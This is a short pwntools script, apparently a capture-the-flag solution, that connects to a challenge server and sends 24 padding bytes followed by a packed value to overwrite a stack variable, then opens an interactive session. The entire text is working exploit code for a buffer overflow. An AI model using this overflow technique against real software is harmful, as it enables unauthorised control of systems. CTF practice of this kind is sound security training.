from pwn import *
p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
 
p.sendline(("A"*24).encode() + p64(0x1337c0de))
 
p.interactive()